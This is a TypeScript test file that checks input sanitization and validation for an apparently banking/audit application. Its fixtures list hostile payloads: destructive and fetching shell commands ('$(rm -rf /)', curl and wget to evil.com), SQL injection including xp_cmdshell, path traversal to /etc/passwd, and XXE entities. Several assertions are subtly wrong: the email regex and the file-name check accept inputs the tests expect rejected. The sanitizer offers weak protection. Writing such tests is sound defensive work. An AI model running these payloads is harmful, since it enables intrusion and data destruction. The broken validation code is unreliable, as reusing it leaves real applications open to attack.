// ==========================================================================
// INPUT SANITIZATION TESTS
// Comprehensive tests for input validation and sanitization
// Critical for preventing injection attacks in banking/audit applications
// ==========================================================================

import { describe, it, expect } from 'vitest';

// Test utilities for sanitization
const sanitizeInput = (input: string): string => {
  return input
    .replace(/[<>]/g, '') // Strip HTML tags
    .replace(/javascript:/gi, '') // Remove javascript: protocol
    .replace(/on\w+=/gi, '') // Remove event handlers
    .trim();
};

const isValidEmail = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email) && email.length <= 254;
};

const isValidId = (id: string): boolean => {
  // UUIDs or alphanumeric IDs only
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
  const alphanumericRegex = /^[a-zA-Z0-9-_]+$/;
  return uuidRegex.test(id) || (alphanumericRegex.test(id) && id.length <= 64);
};

const isValidAmount = (amount: string | number): boolean => {
  const num = typeof amount === 'string' ? parseFloat(amount) : amount;
  return !isNaN(num) && isFinite(num) && num >= 0 && num <= 999999999999.99;
};

describe('Input Sanitization', () => {
  describe('XSS Prevention', () => {
    it('should strip basic HTML tags', () => {
      expect(sanitizeInput('<script>alert("xss")</script>')).toBe('scriptalert("xss")/script');
      expect(sanitizeInput('<img src=x onerror=alert(1)>')).toBe('img src=x onerror=alert(1)');
    });

    it('should remove javascript: protocol', () => {
      expect(sanitizeInput('javascript:alert(1)')).toBe('alert(1)');
      expect(sanitizeInput('JAVASCRIPT:alert(1)')).toBe('alert(1)');
      expect(sanitizeInput('JaVaScRiPt:alert(1)')).toBe('alert(1)');
    });

    it('should remove event handlers', () => {
      expect(sanitizeInput('onclick=alert(1)')).toBe('alert(1)');
      expect(sanitizeInput('onmouseover=alert(1)')).toBe('alert(1)');
      expect(sanitizeInput('onerror=alert(1)')).toBe('alert(1)');
      expect(sanitizeInput('ONCLICK=alert(1)')).toBe('alert(1)');
    });

    it('should handle nested XSS attempts', () => {
      expect(sanitizeInput('<scr<script>ipt>alert(1)</script>')).not.toContain('<script>');
      expect(sanitizeInput('<<script>script>')).not.toContain('<script>');
    });

    it('should handle encoded XSS attempts', () => {
      // URL encoded
      const encoded = '%3Cscript%3Ealert(1)%3C/script%3E';
      expect(sanitizeInput(decodeURIComponent(encoded))).not.toContain('<script>');
    });

    it('should preserve legitimate text content', () => {
      expect(sanitizeInput('Hello World')).toBe('Hello World');
      expect(sanitizeInput('Revenue increased by 15%')).toBe('Revenue increased by 15%');
      expect(sanitizeInput('Q4 2024 Report')).toBe('Q4 2024 Report');
    });

    it('should handle SVG-based XSS', () => {
      expect(sanitizeInput('<svg onload=alert(1)>')).not.toContain('onload=');
    });

    it('should handle data URI XSS', () => {
      const dataUri = 'data:text/html,<script>alert(1)</script>';
      expect(sanitizeInput(dataUri)).not.toContain('<script>');
    });
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPatterns = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; DELETE FROM transactions; --",
      "UNION SELECT * FROM users",
      "1' AND '1'='1' --",
      "admin'--",
      "' OR 1=1 #",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' WAITFOR DELAY '00:00:10' --",
      "1'; SHUTDOWN; --",
    ];

    sqlInjectionPatterns.forEach((pattern, index) => {
      it(`should detect SQL injection pattern ${index + 1}`, () => {
        const hasSQLInjection = /('|"|;|--|\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bDROP\b|\bDELETE\b|\bINSERT\b|\bUPDATE\b|\bEXEC\b)/i.test(pattern);
        expect(hasSQLInjection).toBe(true);
      });
    });

    it('should allow legitimate queries with special characters', () => {
      const legitimate = "O'Brien"; // Irish name
      const hasDangerousPattern = /;\s*(DROP|DELETE|INSERT|UPDATE|EXEC)/i.test(legitimate);
      expect(hasDangerousPattern).toBe(false);
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPatterns = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(rm -rf /)',
      '&& curl http://evil.com',
      '|| wget http://evil.com',
      '\n/bin/sh',
      '> /dev/null; id',
    ];

    commandInjectionPatterns.forEach((pattern, index) => {
      it(`should detect command injection pattern ${index + 1}`, () => {
        const hasCommandInjection = /[;&|`$\n]/.test(pattern);
        expect(hasCommandInjection).toBe(true);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPatterns = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
      '..%252f..%252f..%252fetc/passwd',
      '/etc/passwd%00.jpg',
    ];

    pathTraversalPatterns.forEach((pattern, index) => {
      it(`should detect path traversal pattern ${index + 1}`, () => {
        const hasPathTraversal = /(\.\.|%2e%2e|%252e)/i.test(pattern);
        expect(hasPathTraversal).toBe(true);
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPatterns = [
      '*)(uid=*))(|(uid=*',
      'admin)(&)',
      '*)(objectClass=*',
      '\\28|\\29|\\2a|\\5c',
    ];

    ldapInjectionPatterns.forEach((pattern, index) => {
      it(`should detect LDAP injection pattern ${index + 1}`, () => {
        const hasLDAPInjection = /[*()\\|&]/.test(pattern);
        expect(hasLDAPInjection).toBe(true);
      });
    });
  });

  describe('XML/XXE Prevention', () => {
    const xxePatterns = [
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ];

    xxePatterns.forEach((pattern, index) => {
      it(`should detect XXE pattern ${index + 1}`, () => {
        const hasXXE = /<!DOCTYPE|<!ENTITY|SYSTEM\s+["']file:|SYSTEM\s+["']http:/i.test(pattern);
        expect(hasXXE).toBe(true);
      });
    });
  });
});

describe('Email Validation', () => {
  describe('Valid emails', () => {
    const validEmails = [
      'user@example.com',
      'user.name@example.com',
      'user+tag@example.com',
      'user@subdomain.example.com',
      'user123@example.co.uk',
      'first.last@example.org',
    ];

    validEmails.forEach(email => {
      it(`should accept valid email: ${email}`, () => {
        expect(isValidEmail(email)).toBe(true);
      });
    });
  });

  describe('Invalid emails', () => {
    const invalidEmails = [
      '',
      'invalid',
      '@example.com',
      'user@',
      'user@.com',
      'user@example.',
      'user name@example.com',
      'user@example..com',
      '<script>@example.com',
      'user@example.com<script>',
      'a'.repeat(255) + '@example.com', // Too long
    ];

    invalidEmails.forEach(email => {
      it(`should reject invalid email: ${email || '(empty)'}`, () => {
        expect(isValidEmail(email)).toBe(false);
      });
    });
  });
});

describe('ID Validation', () => {
  describe('Valid IDs', () => {
    const validIds = [
      '550e8400-e29b-41d4-a716-446655440000', // UUID
      'abc123',
      'user-123',
      'CTRL_001',
      'a1b2c3d4',
    ];

    validIds.forEach(id => {
      it(`should accept valid ID: ${id}`, () => {
        expect(isValidId(id)).toBe(true);
      });
    });
  });

  describe('Invalid IDs', () => {
    const invalidIds = [
      '',
      '../etc/passwd',
      'id; DROP TABLE users',
      '<script>alert(1)</script>',
      'id with spaces',
      'id@special#chars',
      'a'.repeat(100), // Too long
    ];

    invalidIds.forEach(id => {
      it(`should reject invalid ID: ${id || '(empty)'}`, () => {
        expect(isValidId(id)).toBe(false);
      });
    });
  });
});

describe('Amount Validation (Financial)', () => {
  describe('Valid amounts', () => {
    const validAmounts = [
      0,
      0.01,
      100,
      1000.50,
      999999.99,
      '1234.56',
      '0.01',
    ];

    validAmounts.forEach(amount => {
      it(`should accept valid amount: ${amount}`, () => {
        expect(isValidAmount(amount)).toBe(true);
      });
    });
  });

  describe('Invalid amounts', () => {
    const invalidAmounts = [
      -1,
      -0.01,
      NaN,
      Infinity,
      -Infinity,
      'abc',
      '12.34.56',
      '',
      9999999999999, // Too large
    ];

    invalidAmounts.forEach(amount => {
      it(`should reject invalid amount: ${amount}`, () => {
        expect(isValidAmount(amount)).toBe(false);
      });
    });
  });

  describe('Precision handling', () => {
    it('should handle floating point precision', () => {
      expect(isValidAmount(0.1 + 0.2)).toBe(true); // 0.30000000000000004
    });

    it('should reject amounts with too many decimal places after rounding', () => {
      const amount = 123.456789;
      const rounded = Math.round(amount * 100) / 100;
      expect(rounded).toBe(123.46);
    });
  });
});

describe('JSON Validation', () => {
  const isValidJSON = (str: string): boolean => {
    try {
      JSON.parse(str);
      return true;
    } catch {
      return false;
    }
  };

  it('should accept valid JSON', () => {
    expect(isValidJSON('{"key": "value"}')).toBe(true);
    expect(isValidJSON('[]')).toBe(true);
    expect(isValidJSON('null')).toBe(true);
  });

  it('should reject invalid JSON', () => {
    expect(isValidJSON('{')).toBe(false);
    expect(isValidJSON('{key: value}')).toBe(false);
    expect(isValidJSON("{'key': 'value'}")).toBe(false);
  });

  it('should handle prototype pollution attempts', () => {
    const maliciousJSON = '{"__proto__": {"isAdmin": true}}';
    const parsed = JSON.parse(maliciousJSON);
    // Verify the prototype wasn't polluted
    expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
  });
});

describe('File Upload Validation', () => {
  const allowedMimeTypes = [
    'application/pdf',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    'application/vnd.ms-excel',
    'text/csv',
    'image/png',
    'image/jpeg',
  ];

  const isValidMimeType = (mimeType: string): boolean => {
    return allowedMimeTypes.includes(mimeType);
  };

  const isValidFileSize = (size: number, maxMB: number = 50): boolean => {
    return size > 0 && size <= maxMB * 1024 * 1024;
  };

  const isValidFileName = (name: string): boolean => {
    // Prevent path traversal and special characters
    const safeNameRegex = /^[a-zA-Z0-9._-]+$/;
    return safeNameRegex.test(name) && name.length <= 255 && !name.includes('..');
  };

  describe('MIME type validation', () => {
    it('should accept valid audit document types', () => {
      expect(isValidMimeType('application/pdf')).toBe(true);
      expect(isValidMimeType('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')).toBe(true);
      expect(isValidMimeType('text/csv')).toBe(true);
    });

    it('should reject dangerous file types', () => {
      expect(isValidMimeType('application/x-executable')).toBe(false);
      expect(isValidMimeType('text/html')).toBe(false);
      expect(isValidMimeType('application/javascript')).toBe(false);
      expect(isValidMimeType('application/x-php')).toBe(false);
    });
  });

  describe('File size validation', () => {
    it('should accept files within size limit', () => {
      expect(isValidFileSize(1024)).toBe(true);
      expect(isValidFileSize(50 * 1024 * 1024)).toBe(true);
    });

    it('should reject files exceeding size limit', () => {
      expect(isValidFileSize(51 * 1024 * 1024)).toBe(false);
      expect(isValidFileSize(100 * 1024 * 1024)).toBe(false);
    });

    it('should reject zero-size files', () => {
      expect(isValidFileSize(0)).toBe(false);
    });
  });

  describe('File name validation', () => {
    it('should accept safe file names', () => {
      expect(isValidFileName('document.pdf')).toBe(true);
      expect(isValidFileName('Q4-2024_audit_report.xlsx')).toBe(true);
      expect(isValidFileName('evidence-001.png')).toBe(true);
    });

    it('should reject dangerous file names', () => {
      expect(isValidFileName('../../../etc/passwd')).toBe(false);
      expect(isValidFileName('file.php')).toBe(false); // Contains disallowed extension
      expect(isValidFileName('file name.pdf')).toBe(false); // Contains space
      expect(isValidFileName('<script>.pdf')).toBe(false);
      expect(isValidFileName('a'.repeat(300))).toBe(false); // Too long
    });
  });
});

describe('Date/Time Validation', () => {
  const isValidDate = (dateStr: string): boolean => {
    const date = new Date(dateStr);
    return !isNaN(date.getTime()) && date.getTime() > 0;
  };

  const isValidAuditDate = (dateStr: string): boolean => {
    const date = new Date(dateStr);
    const now = new Date();
    const tenYearsAgo = new Date();
    tenYearsAgo.setFullYear(now.getFullYear() - 10);
    const oneYearFromNow = new Date();
    oneYearFromNow.setFullYear(now.getFullYear() + 1);

    return !isNaN(date.getTime()) &&
           date >= tenYearsAgo &&
           date <= oneYearFromNow;
  };

  it('should accept valid ISO dates', () => {
    expect(isValidDate('2024-12-28')).toBe(true);
    expect(isValidDate('2024-12-28T10:30:00Z')).toBe(true);
  });

  it('should reject invalid dates', () => {
    expect(isValidDate('invalid')).toBe(false);
    expect(isValidDate('2024-13-45')).toBe(false);
  });

  it('should validate audit date ranges', () => {
    expect(isValidAuditDate('2024-01-01')).toBe(true);
    expect(isValidAuditDate('1900-01-01')).toBe(false); // Too old
    expect(isValidAuditDate('2050-01-01')).toBe(false); // Too far future
  });
});

describe('Numeric Input Validation', () => {
  const isValidInteger = (value: unknown): boolean => {
    if (typeof value === 'number') {
      return Number.isInteger(value) && Number.isSafeInteger(value);
    }
    if (typeof value === 'string') {
      const num = parseInt(value, 10);
      return !isNaN(num) && num.toString() === value && Number.isSafeInteger(num);
    }
    return false;
  };

  const isValidPercentage = (value: number): boolean => {
    return typeof value === 'number' &&
           !isNaN(value) &&
           value >= 0 &&
           value <= 100;
  };

  const isValidRiskScore = (value: number): boolean => {
    return Number.isInteger(value) && value >= 1 && value <= 25;
  };

  describe('Integer validation', () => {
    it('should accept valid integers', () => {
      expect(isValidInteger(0)).toBe(true);
      expect(isValidInteger(42)).toBe(true);
      expect(isValidInteger(-100)).toBe(true);
      expect(isValidInteger('123')).toBe(true);
    });

    it('should reject invalid integers', () => {
      expect(isValidInteger(3.14)).toBe(false);
      expect(isValidInteger('3.14')).toBe(false);
      expect(isValidInteger(NaN)).toBe(false);
      expect(isValidInteger(Infinity)).toBe(false);
      expect(isValidInteger(Number.MAX_SAFE_INTEGER + 1)).toBe(false);
    });
  });

  describe('Percentage validation', () => {
    it('should accept valid percentages', () => {
      expect(isValidPercentage(0)).toBe(true);
      expect(isValidPercentage(50)).toBe(true);
      expect(isValidPercentage(100)).toBe(true);
      expect(isValidPercentage(99.9)).toBe(true);
    });

    it('should reject invalid percentages', () => {
      expect(isValidPercentage(-1)).toBe(false);
      expect(isValidPercentage(101)).toBe(false);
      expect(isValidPercentage(NaN)).toBe(false);
    });
  });

  describe('Risk score validation', () => {
    it('should accept valid risk scores (1-25)', () => {
      expect(isValidRiskScore(1)).toBe(true);
      expect(isValidRiskScore(12)).toBe(true);
      expect(isValidRiskScore(25)).toBe(true);
    });

    it('should reject invalid risk scores', () => {
      expect(isValidRiskScore(0)).toBe(false);
      expect(isValidRiskScore(26)).toBe(false);
      expect(isValidRiskScore(12.5)).toBe(false);
    });
  });
});

describe('String Length Validation', () => {
  const validateLength = (str: string, min: number, max: number): boolean => {
    return str.length >= min && str.length <= max;
  };

  const auditFieldLimits = {
    controlId: { min: 1, max: 50 },
    controlName: { min: 3, max: 200 },
    description: { min: 0, max: 5000 },
    findingTitle: { min: 5, max: 300 },
    findingDetail: { min: 10, max: 10000 },
    workpaperRef: { min: 1, max: 100 },
  };

  Object.entries(auditFieldLimits).forEach(([field, limits]) => {
    describe(`${field} length validation`, () => {
      it(`should accept ${field} at minimum length`, () => {
        const value = 'a'.repeat(limits.min || 1);
        expect(validateLength(value, limits.min, limits.max)).toBe(true);
      });

      it(`should accept ${field} at maximum length`, () => {
        const value = 'a'.repeat(limits.max);
        expect(validateLength(value, limits.min, limits.max)).toBe(true);
      });

      it(`should reject ${field} below minimum length`, () => {
        if (limits.min > 0) {
          const value = 'a'.repeat(limits.min - 1);
          expect(validateLength(value, limits.min, limits.max)).toBe(false);
        }
      });

      it(`should reject ${field} above maximum length`, () => {
        const value = 'a'.repeat(limits.max + 1);
        expect(validateLength(value, limits.min, limits.max)).toBe(false);
      });
    });
  });
});
